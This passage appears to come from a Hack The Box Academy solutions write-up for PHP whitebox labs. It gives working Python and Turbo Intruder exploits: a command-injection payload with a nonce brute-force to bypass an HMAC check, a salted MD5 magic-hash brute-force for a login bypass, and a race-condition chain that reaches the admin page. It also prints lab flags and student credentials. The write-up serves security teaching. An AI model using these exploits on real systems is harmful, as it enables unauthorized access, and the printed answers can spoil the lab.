--2023-07-05 22:41:46--  https://academy.hackthebox.com/storage/modules/205/code_typejuggling_advanced.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4839 (4.7K) [application/zip]
Saving to: ‘code_typejuggling_advanced.zip’

code_typejuggling_advanced.zip          100%[=============================================================================>]   4.73K  --.-KB/s    in 0s      

2023-07-05 22:41:46 (45.5 MB/s) - ‘code_typejuggling_advanced.zip’ saved [4839/4839]

Archive:  code_typejuggling_advanced.zip
  inflating: config.php              
  inflating: dir.php                 
  inflating: hmac.php                
  inflating: index.php               
  inflating: test.css
```

Students are highly encouraged to perform the same source code analysis as in the section to discover the vulnerabilities. The web application suffers from the same command injection and type juggling vulnerabilities. To exploit the application and read the contents of the `/hmackey.txt` file, students can utilize the same Python script, however, it requires a valid session cookie.

Therefore, students need to sign in with the credentials `htb-stdnt:Academy_student!` and get the value of the `PHPSESSID` cookie:

![[HTB Solutions/CWEE/z. images/e3264001fafb7497689928d6ba159c74_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/10cc59bfe223844f4e796e742ea1127d_MD5.jpg]]

Subsequently, students need to utilize it in the script, in addition to making the injected command to be `cat /hmackey.txt` instead of `whoami`:

Code: python

```python
import requests

URL = "http://STMIP:STMPO/dir.php"
COOKIES = {"PHPSESSID": "gjddb55pmtb24pnp1njtf85kpk"}

DIR = "/home/htb-stdnt/; cat /hmackey.txt"
MAC = 0
MAX_NONCE = 20000

def prepare_params(nonce):
    return {
        "dir": DIR,
        "nonce": nonce,
        "mac": MAC
    }

def make_request(nonce):
    return requests.get(URL, cookies=COOKIES, params=prepare_params(nonce))

# main
for n in range(MAX_NONCE):
    r = make_request(n)

    if not "Error! Invalid MAC" in r.text:
        print("Found valid MAC:")
        print(r.url)
        break
```

After running the script, students will attain a URL with a valid MAC. When visiting it, students will find the flag `HTB{96364150ec4520c703ed4eeb5ce2893d}`:

Code: shell

```shell
python3 solver.py
```

```shell
┌─[eu-academy-1]─[10.10.14.41]─[htb-ac-413848@htb-xgpgjbdpzh]─[~]
└──╼ [★]$ python3 solver.py

Found valid MAC:
http://139.59.188.199:32632/dir.php?dir=%2Fhome%2Fhtb-stdnt%2F%3B+cat+%2Fhmackey.txt&nonce=6241&mac=0
```

![[HTB Solutions/CWEE/z. images/e24e6cc83786b7b7a7e62210d8004179_MD5.jpg]]

Answer: `HTB{96364150ec4520c703ed4eeb5ce2893d}`

# Skills Assessment

## Question 1

### "Exploit the web application and obtain the flag."

After spawning the target machine, students need to download [code\_skillsassessment.zip](https://academy.hackthebox.com/storage/modules/205/code_skillsassessment.zip) and then unzip it:

```shell
wget https://academy.hackthebox.com/storage/modules/205/code_skillsassessment.zip && unzip code_skillsassessment.zip
```
```shell
┌─[eu-academy-1]─[10.10.14.41]─[htb-ac-413848@htb-7nouwr2zff]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/205/code_skillsassessment.zip && unzip code_skillsassessment.zip

--2023-07-06 04:29:36--  https://academy.hackthebox.com/storage/modules/205/code_skillsassessment.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 146376 (143K) [application/zip]
Saving to: ‘code_skillsassessment.zip’

code_skillsassessment.zip                            100%[=====================================================================================================================>] 142.95K  --.-KB/s    in 0.006s  

2023-07-06 04:29:36 (23.6 MB/s) - ‘code_skillsassessment.zip’ saved [146376/146376]

Archive:  code_skillsassessment.zip
   creating: src/
  inflating: src/admin.php           
  inflating: src/config.php          
   <SNIP>
```

Subsequently, students need to analyze the source code of the client's web application to discover vulnerabilities. For easier viewing of the codebase, students can use `VS Code`:

```shell
code src/
```
```shell
┌─[eu-academy-1]─[10.10.14.41]─[htb-ac-413848@htb-7nouwr2zff]─[~]
└──╼ [★]$ code src/
```

![[HTB Solutions/CWEE/z. images/089b092d010b7ce458d9453505ce9f22_MD5.jpg]]

Out of the seven .PHP web page files, `index.php` and `logout.php` can be ignored since they do not contain any business logic.

When analyzing the codebase, students can deduce that for roles, the magic number `0` equates to the `admin` role, as implied by lines 14-17 in `admin.php` (because only admins are authorized to visit `/admin.php`):

```php
if ($user_data['role'] != 0) {
        header('Location: profile.php');
        exit;
    }
```

Additionally, students can deduce that the magic number `2` equates to the `guest` role, as implied by line 14 in `manage.php`:

```php
// guests are unauthorized
    if ($user_data['role'] >= 2) {
        header('Location: profile.php');
        exit;
    }
```

Therefore, given that there are no other explicit roles given by the client (nor any found in the codebase), students can deduce that the magic number `1` equates to the `user` role, given that `0` equates to `admin` and `2` equates to `guest`.

Knowing that, when reviewing the user's database records provided by the client, all users with role `2` can be ignored as they are guests. This leaves only 4 accounts; when scrutinizing them further, students will notice that the password (hash) of `larry` begins with `0e` and contains only numbers afterward:

```sql
+----+-----------+----------------------------------+------+
| id | username  | password                         | role |
+----+-----------+----------------------------------+------+
|  1 | admin     | 0f5ff846bf7ae24489371cd8b7c1a1cd |    0 |
|  2 | vicky     | f179a0139bcdfd8cb317bc909d772872 |    1 |
|  3 | larry     | 0e656540908354891055044945395170 |    1 |
|  4 | ugo       | 076395db88a35e081442b0a4c6b9ce93 |    1 |
+----+-----------+----------------------------------+------+
```

This is crucial to notice because there is a type juggling vulnerability in the `login` function (`config.php` lines 20-42) responsible for authentication. Students will notice that on line 37, to compare hashes, the loose comparison operator `==` is used instead of the strict `===`:

```php
function login($user, $password){
    global $conn;

    $sql = "SELECT * FROM users WHERE username=?;";
    $stmt = mysqli_stmt_init($conn);
    if(!mysqli_stmt_prepare($stmt, $sql)){
        echo "SQL Error";
        exit();
    }

    // execute query
    mysqli_stmt_bind_param($stmt, "s", $user);
    mysqli_stmt_execute($stmt);
    $result = mysqli_stmt_get_result($stmt);

    // check result
    if ($row = mysqli_fetch_assoc($result)) {
        if (pw_hash($password) == $row["password"]){
            return True;
        }
    }
    return False;
}
```

Therefore, students need to find a magic hash with the same format as `larry`'s password hash. However, the Github collection of [PHP magic hashes](https://github.com/spaze/hashes) is of no use since the `pw_hash` function in `config.php` (lines 14-18) utilizes the custom salt `it6z` along with the MD5 algorithm to hash passwords:

```php
function pw_hash($password){
    $salt = 'it6z';
    $hash = md5($salt . $password);
    return $hash;
}
```

Thus, students need to create a Python script to find a magic hash with the custom salt (the [for else](https://docs.python.org/3/tutorial/controlflow.html#break-and-continue-statements-and-else-clauses-on-loops) construct is used to find only one magic hash, deleting it will allow yielding more magic hashes):

```python
import hashlib
import re
import string
import itertools

wantedHashesPattern = re.compile(r"^0e([0-9]*)$")
salt = 'it6z'
maxLength = 6
passwordCharacters = string.ascii_letters + string.digits + string.punctuation

for i in range(1, maxLength + 1):
    for password in itertools.product(passwordCharacters, repeat = i):
        password = ''.join(password)
        hashInput = salt + password
        hash = hashlib.md5(hashInput.encode()).hexdigest()
        if wantedHashesPattern.match(hash):
            print(f"{password} ---> {hash}")
            break
    else:
        continue
    break
```

After running the script and waiting for a while, students will attain the password `cqD0P`:

```shell
python3 magicHash.py
```
```shell
┌─[eu-academy-1]─[10.10.14.168]─[htb-ac-413848@htb-3eofrvsnyw]─[~]
└──╼ [★]$ python3 magicHash.py

cqD0P ---> 0e730595472905074128581214508339
```

Students need to navigate to `/login.php` and login with the credentials `larry:cqD0P`:

![[HTB Solutions/CWEE/z. images/1417a3a1068440452ae6e7b6a6ef58e3_MD5.jpg]]

Effectively, students have escalated privileges to a user with the `user` role, gaining access to `/manage.php`:

![[HTB Solutions/CWEE/z. images/42701c1805a83c61011f05375e108ba9_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/f72a5bdb42e60209e89d22600ce09225_MD5.jpg]]

When analyzing `manage.php`, students will notice that when a user is deleted (lines 27-32), the session is destroyed only after the user has been deleted from the database; therefore, this introduces a race condition and allows deleted users to interact with the web application even after being deleted:

```php
// delete user
    if(isset($_POST['delete'])) {
        delete_user($user_data['username']);
        session_destroy();
        header('Location: login.php');
        exit;
      }
```

Moreover, in `admin.php` lines 14-17, students will notice that there is a type juggling vulnerability due to using the loose comparison operator `!=`:

```php
// only admins are authorized
    if ($user_data['role'] != 0) {
        header('Location: profile.php');
        exit;
    }
```

Equally important, students will also notice that the function `fetch_user_data` (lines 44-64) in `config.php` returns an empty array (line 63) if the passed username does not correspond to a user in the database:

```php
function fetch_user_data($username){
    global $conn;

    $sql = "SELECT * FROM users WHERE username=?;";
    $stmt = mysqli_stmt_init($conn);
    if(!mysqli_stmt_prepare($stmt, $sql)){
        echo "SQL Error fetch_user_data";
        exit();
    }

    // execute query
    mysqli_stmt_bind_param($stmt, "s", $username);
    mysqli_stmt_execute($stmt);
    $result = mysqli_stmt_get_result($stmt);

    // check result
    if ($row = mysqli_fetch_assoc($result)) {
        return $row;
    }
    return array();
}
```

Students need to chain the race condition present in `manage.php` with the type juggling vulnerability in `admin.php` by abusing the return type by `fetch_user_data` to access `/admin.php`. Because a deleted user will not have any data associated with it, the comparison `$user_data['role'] != 0` will effectively be `NULL != 0`, which, due to type juggling, evaluates to false, and therefore bypasses the check on the role `admin`.

Students need to utilize `Turbo Intruder` to chain the vulnerabilities and exploit the race condition. In `Burp Suite`, students need to click on `Extender` ---> `BApp Store` and then install `Turbo Intruder`:

![[HTB Solutions/CWEE/z. images/fec2a5140fca4882af37326568511cde_MD5.webp]]

To bypass the locks on PHP's session files, students need to attain two different PHP session IDs by intercepting the login request and saving the value of `PHPSESSID` returned in the response (in case there is a `Cookie` header present within the first request, students need to remove it):

![[HTB Solutions/CWEE/z. images/8408c3cb4d55c6f07d3fc08a6de10551_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/f5bd1154693dc84405ae03ca05149b9e_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/6107092d3850e12ae84e8af46f4fc5ad_MD5.jpg]]

For the second intercepted request, students need to send it to `Turbo Intruder`:

![[HTB Solutions/CWEE/z. images/70abb68698f684189f3102928a905623_MD5.jpg]]

Thereafter, students need to write a custom script to chain the vulnerabilities and access `/admin.php`:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='http://STMIP:STMPO',
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False
                           )

    admin_req = '''GET /admin.php HTTP/1.1
Host: STMIP:STMPO
Cookie: PHPSESSID=<COOKIE>
Connection: close

'''

    delete_req = '''POST /manage.php HTTP/1.1
Host: STMIP:STMPO
Content-Length: 8
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<COOKIE>
Connection: close

delete=1'''

    engine.queue(admin_req, gate='race1')
    engine.queue(admin_req, gate='race1')
    engine.queue(delete_req, gate='race1')
    engine.queue(admin_req, gate='race1')
    engine.queue(admin_req, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

Students then need to start the attack and check the responses attained for the GET request to `/admin.php`. The exploit might not work the first time, therefore, students need to keep retrying the attack. Eventually, when the race condition is exploited, students will attain the flag `HTB{0f1479898ef23d1b6ab1e921ae4d5ca8}`:

![[HTB Solutions/CWEE/z. images/2106c1e912b50d968c06ee82f4fe2fbe_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/d143f83428ae40df5d3ae196ffa4c814_MD5.jpg]]

Answer: `HTB{0f1479898ef23d1b6ab1e921ae4d5ca8}`